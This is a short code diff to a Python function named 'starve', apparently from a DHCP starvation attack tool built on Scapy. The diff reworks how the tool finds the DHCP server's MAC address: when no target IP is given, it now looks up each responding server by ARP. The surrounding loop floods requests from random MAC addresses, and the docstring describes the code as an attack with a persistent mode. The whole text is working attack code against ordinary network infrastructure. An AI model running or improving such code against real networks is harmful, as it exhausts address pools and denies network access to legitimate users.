@@ -65,7 +65,9 @@ def starve(target_ip=0, i_face=conf.iface, persistent=False):
     :param i_face: the systems network interface for the attack
     :param persistent: a flag indicating if the attack is persistent or temporary
     """
-    server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
+    cur_ip = 0
+    if target_ip:
+        server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
     while True:
         counter = 0
         mac = RandMAC()
@@ -96,7 +98,9 @@ def starve(target_ip=0, i_face=conf.iface, persistent=False):
                 if p[0][DHCP].options[0][1] == 2:
                     ip = p[0][BOOTP].yiaddr
                     src = p[0][IP].src
-                    server_mac = p[0][Ether].src
+                    if not target_ip and not src == cur_ip:
+                        cur_ip = src
+                        server_mac = sr1(ARP(op=1, pdst=str(src)))[0][ARP].hwsrc
                     if src == target_ip or not target_ip:
                         break
                     continue
